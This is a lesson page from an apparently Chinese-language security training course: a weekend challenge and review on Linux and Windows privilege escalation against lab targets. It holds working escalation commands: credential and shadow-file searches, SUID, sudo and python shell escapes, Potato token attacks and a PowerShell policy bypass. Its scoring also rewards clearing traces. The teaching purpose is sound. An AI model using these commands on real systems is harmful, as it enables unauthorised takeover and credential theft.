---
title: Day058：Week 9 周末闯关 - 系统提权综合
tags:
  - 网络安全
  - 系统提权
  - 周末闯关
  - Linux提权
  - Windows提权
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d058
date: 2026-03-21
updated: 2026-01-28
---

# Day058：Week 9 周末闯关 - 系统提权综合

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | 周末综合闯关 + 本周回顾 |
| **预计时间** | 4-5 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：老板在周会上说："一周时间学提权，现在给你一台机器，能提到 root/SYSTEM 吗？"
>
> **问题**：面对真实机器，能否独立完成从低权限到最高权限的提权？
>
> **今天的任务**：通过综合闯关检验本周所学——这是对你提权能力的真正考验。

---

## 今日目标

- [ ] 完成 Linux 提权综合挑战
- [ ] 完成 Windows 提权综合挑战
- [ ] 输出本周知识总结
- [ ] 形成个人提权 Checklist

**闯关条件**：在 Linux 和 Windows 各一台靶机上成功提权到最高权限。

---

## 综合闯关挑战

### 挑战 1：Linux 全流程提权（90 分钟）

**靶机准备**：
```
推荐靶机（任选其一）：
1. VulnHub - SickOs 1.2
2. VulnHub - Kioptrix Level 1-5
3. TryHackMe - Linux PrivEsc
4. HackTheBox - 任意 Easy Linux 靶机
```

**挑战要求**：
```
从获取初始 shell 开始：
1. 完整信息收集
2. 识别所有提权向量
3. 选择最佳向量提权
4. 获得 root shell
5. 读取 flag
```

**提权 Checklist**：
```bash
# === 信息收集阶段 ===
# 1. 基本信息
whoami && id
uname -a
cat /etc/*release

# 2. SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 3. Capabilities
getcap -r / 2>/dev/null

# 4. Sudo 权限
sudo -l

# 5. Cron 任务
cat /etc/crontab
ls -la /etc/cron.d/
# 使用 pspy 监控

# 6. 敏感文件
find / -name "*.bak" 2>/dev/null
find / -name "*password*" 2>/dev/null
cat /etc/passwd
ls -la /home/

# 7. 自动化工具
./linpeas.sh
./linux-exploit-suggester.sh

# === 利用阶段 ===
# 根据发现选择利用方法
# SUID/Capabilities/Sudo/Cron/内核
```

**评分标准**：
| 检查点 | 分数 |
|--------|------|
| 完成系统信息收集 | 10 分 |
| 发现至少 3 个提权向量 | 15 分 |
| 成功识别正确向量 | 15 分 |
| 成功获取 root shell | 40 分 |
| 读取 flag | 10 分 |
| 清理痕迹/后渗透 | 10 分 |

**你的得分**：____/100

**记录**：
```
使用的靶机：________________
发现的提权向量：
1. ________________
2. ________________
3. ________________

最终使用的方法：________________
获取 root 用时：________________
```

---

### 挑战 2：Windows 全流程提权（90 分钟）

**靶机准备**：
```
推荐靶机（任选其一）：
1. VulnHub - Metasploitable 3
2. TryHackMe - Windows PrivEsc
3. TryHackMe - Steel Mountain
4. HackTheBox - 任意 Easy Windows 靶机
```

**挑战要求**：
```
从获取初始 shell 开始：
1. 完整信息收集
2. 识别所有提权向量
3. 选择最佳向量提权
4. 获得 SYSTEM/Administrator shell
5. 读取 flag
```

**提权 Checklist**：
```cmd
:: === 信息收集阶段 ===
:: 1. 基本信息
whoami /all
hostname
systeminfo

:: 2. 用户和组
net user
net localgroup Administrators

:: 3. 令牌权限
whoami /priv
:: 关注 SeImpersonatePrivilege

:: 4. 服务
wmic service get name,pathname,startmode
:: 查找未引用路径

:: 5. 注册表
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 6. 凭据搜索
dir /s *password* *passwd* *credentials*
cmdkey /list

:: 7. 自动化工具
winPEASx64.exe
:: 或 PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

:: === 利用阶段 ===
:: 服务/令牌/AlwaysInstallElevated/内核
```

**评分标准**：
| 检查点 | 分数 |
|--------|------|
| 完成系统信息收集 | 10 分 |
| 发现至少 3 个提权向量 | 15 分 |
| 成功识别正确向量 | 15 分 |
| 成功获取 SYSTEM shell | 40 分 |
| 读取 flag | 10 分 |
| 清理痕迹/后渗透 | 10 分 |

**你的得分**：____/100

**记录**：
```
使用的靶机：________________
发现的提权向量：
1. ________________
2. ________________
3. ________________

最终使用的方法：________________
获取 SYSTEM 用时：________________
```

---

### 挑战 3：盲提权挑战（选做，60 分钟）

**规则**：
```
不使用任何自动化工具（LinPEAS、WinPEAS、PowerUp 等）
只用手动命令完成提权
```

**目的**：
- 检验真正理解了提权原理
- 而不是只会跑工具

**手动命令清单**：

**Linux**：
```bash
# 系统信息
cat /etc/passwd
cat /etc/shadow  # 如果可读
cat /etc/sudoers  # 如果可读

# SUID
find / -perm -4000 2>/dev/null

# 可写文件
find / -writable -type f 2>/dev/null

# 进程
ps aux

# 网络
netstat -antp

# 历史记录
cat ~/.bash_history
```

**Windows**：
```cmd
:: 系统信息
systeminfo | findstr /B /C:"OS"

:: 服务
sc query
wmic service list brief

:: 进程
tasklist /svc

:: 网络
netstat -ano

:: 已安装软件
wmic product get name,version
```

**记录**：
```
手动发现的向量：________________
提权是否成功：________________
与工具对比遗漏的点：________________
```

---

## Week 9 知识回顾

### 本周技能树

```
Week 9：系统提权入门
├── Day052：Linux 提权基础
│   ├── Linux 权限模型（UID/GID/EUID）
│   ├── 手动信息收集
│   └── 自动化工具（LinPEAS/LinEnum）
│
├── Day053：SUID/SGID/Capabilities
│   ├── SUID 提权方法（find/vim/python...）
│   ├── SGID 与组权限（docker/lxd）
│   └── Capabilities 提权（CAP_SETUID...）
│
├── Day054：Sudo 与 Cron
│   ├── Sudo 配置滥用
│   ├── Cron 任务利用
│   ├── PATH 劫持
│   └── 通配符注入
│
├── Day055：Windows 提权基础
│   ├── Windows 权限模型（Token/SID）
│   ├── 手动信息收集
│   └── 自动化工具（WinPEAS/PowerUp）
│
├── Day056：服务与令牌
│   ├── 未引用服务路径
│   ├── 服务权限滥用
│   ├── Potato 系列攻击
│   ├── AlwaysInstallElevated
│   └── DLL 劫持
│
└── Day057：内核漏洞
    ├── 内核漏洞类型
    ├── Linux 内核漏洞（Dirty COW/Pipe/PwnKit）
    └── Windows 内核漏洞（EternalBlue/Print Nightmare）
```

### 核心命令速查

**Linux 提权**：
```bash
# 信息收集
uname -a && cat /etc/*release
id && whoami
sudo -l

# SUID 发现
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# 常用提权
find . -exec /bin/sh -p \; -quit
sudo vim -c ':!/bin/sh'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 自动化
./linpeas.sh | tee linpeas_output.txt
./linux-exploit-suggester.sh
```

**Windows 提权**：
```cmd
:: 信息收集
whoami /all
systeminfo | findstr /B /C:"OS"
wmic service get name,pathname

:: 令牌检查
whoami /priv

:: Potato 攻击
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd"

:: 自动化
winPEASx64.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

### 工具速查表

| 工具 | 平台 | 用途 |
|------|------|------|
| LinPEAS | Linux | 全面枚举 |
| LinEnum | Linux | 快速枚举 |
| linux-exploit-suggester | Linux | 内核漏洞建议 |
| pspy | Linux | 进程监控 |
| WinPEAS | Windows | 全面枚举 |
| PowerUp | Windows | PowerShell 枚举 |
| Seatbelt | Windows | 系统信息 |
| accesschk | Windows | 权限检查 |
| PrintSpoofer | Windows | 令牌模拟 |
| GodPotato | Windows | 令牌模拟 |

### 关键资源

```
GTFOBins（Linux）：https://gtfobins.github.io/
LOLBAS（Windows）：https://lolbas-project.github.io/
PayloadsAllTheThings：https://github.com/swisskyrepo/PayloadsAllTheThings
HackTricks：https://book.hacktricks.xyz/
```

---

## 提权思维导图

```
获得初始 shell
       │
       ▼
  我是谁？在哪？
   whoami / id
       │
       ▼
 ┌─────┴─────┐
 │           │
Linux     Windows
 │           │
 ▼           ▼

Linux 检查清单：
1. sudo -l → 可 sudo 的命令？
2. SUID/SGID → 特殊权限文件？
3. Capabilities → 危险能力？
4. Cron → 定时任务可写？
5. 敏感文件 → 密码/密钥？
6. 内核版本 → 已知漏洞？

Windows 检查清单：
1. whoami /priv → SeImpersonate？
2. 服务 → 未引用路径？可写？
3. 注册表 → AlwaysInstallElevated？
4. 凭据 → 明文密码？
5. 计划任务 → 可修改？
6. 内核/补丁 → 已知漏洞？
       │
       ▼
  选择最佳向量
       │
       ▼
  执行提权利用
       │
       ▼
  获得最高权限！
```

---

## Week 9 面试问答

**Q1：Linux 提权有哪些常见方法？**

A1：
```
1. SUID/SGID 滥用
   - 寻找有 SUID 的程序
   - 利用程序执行 shell

2. Sudo 配置错误
   - sudo -l 查看权限
   - GTFOBins 查利用方法

3. Cron 任务
   - 可写的脚本
   - PATH 劫持
   - 通配符注入

4. Capabilities
   - CAP_SETUID 直接提权
   - CAP_DAC_OVERRIDE 读写任意文件

5. 内核漏洞
   - Dirty COW、Dirty Pipe 等
   - linux-exploit-suggester 查建议

6. 敏感信息泄露
   - 配置文件中的密码
   - SSH 私钥
```

**Q2：Windows 上发现 SeImpersonatePrivilege，如何提权？**

A2：
```
使用 Potato 系列攻击：

1. 检查 Windows 版本
   systeminfo

2. 选择合适的工具：
   - Windows 10/Server 2016+：PrintSpoofer 或 GodPotato
   - 老版本：JuicyPotato

3. 执行提权：
   PrintSpoofer.exe -i -c cmd
   GodPotato.exe -cmd "whoami"

原理：
- SeImpersonatePrivilege 允许模拟其他用户令牌
- Potato 攻击诱使 SYSTEM 账户连接
- 捕获 SYSTEM 令牌并使用
```

**Q3：如何判断一个 SUID 程序是否可利用？**

A3：
```
1. 查询 GTFOBins
   https://gtfobins.github.io/
   搜索程序名，看是否有 SUID 利用方法

2. 分析程序功能
   - 能否执行命令？（如 find -exec）
   - 能否读写文件？（如 vim、cp）
   - 能否调用 shell？（如 less、more）

3. 检查程序版本
   - 某些利用只在特定版本有效
   - 如 nmap --interactive 只在老版本

4. 尝试常见 payload
   !/bin/sh（在交互程序中）
   -exec /bin/sh \;（在 find 中）
```

**Q4：内核漏洞利用的风险是什么？**

A4：
```
风险：
1. 系统崩溃（BSOD/Kernel Panic）
2. 触发安全告警
3. 留下明显日志
4. 利用不稳定可能多次失败

最佳实践：
1. 内核利用是最后手段，先尝试其他方法
2. 确认版本精确匹配
3. 在测试环境先验证
4. 了解利用失败的后果
5. 准备好备用方案
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| Linux 综合挑战完成 | 35 分 |
| Windows 综合挑战完成 | 35 分 |
| 知识总结输出 | 15 分 |
| 个人 Checklist 形成 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 下周预告

**Week 10：第二阶段收官**

| 天数 | 主题 |
|------|------|
| Day059 | 阶段复盘与知识整合 |
| Day060 | 第二阶段综合考核 |

下周你将：
- 完成攻坚阶段总复盘
- 进行综合技能考核
- 准备进入第三阶段（实战演练）

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Linux 提权得分 | |
| Windows 提权得分 | |
| 形成的个人 Checklist | |
| 本周最大收获 | |
| 还需加强的技能 | |

---

## 个人提权 Checklist 模板

请根据本周学习，完善你的个人提权检查清单：

**Linux 提权 Checklist**：
```
□ 基本信息（uname/id/whoami）
□
□
□
□
□
```

**Windows 提权 Checklist**：
```
□ 基本信息（systeminfo/whoami）
□
□
□
□
□
```

---

> **导师点评**：
>
> 恭喜你完成了 Week 9 的提权学习！
>
> 提权是渗透测试中最关键的技能之一——拿到 shell 不等于拿到权限，拿到权限才算真正控制了机器。
>
> 这周你学了很多技术：SUID、Capabilities、Sudo、Cron、服务、令牌、内核漏洞……但最重要的是形成一套**系统化的提权思路**：
>
> 1. **先枚举，后利用**——信息收集决定成败
> 2. **先简单，后复杂**——sudo 比内核漏洞稳定
> 3. **工具辅助，手动验证**——不要完全依赖工具
> 4. **记录过程，形成清单**——下次更快更准
>
> **提权没有捷径，只有经验。多打靶机，多踩坑，才能形成直觉**。
>
> 下周进入第二阶段收官，好好准备！

```bash
echo "Week 9 Complete! 系统提权技能解锁！"
echo "准备进入第二阶段收官..."
```
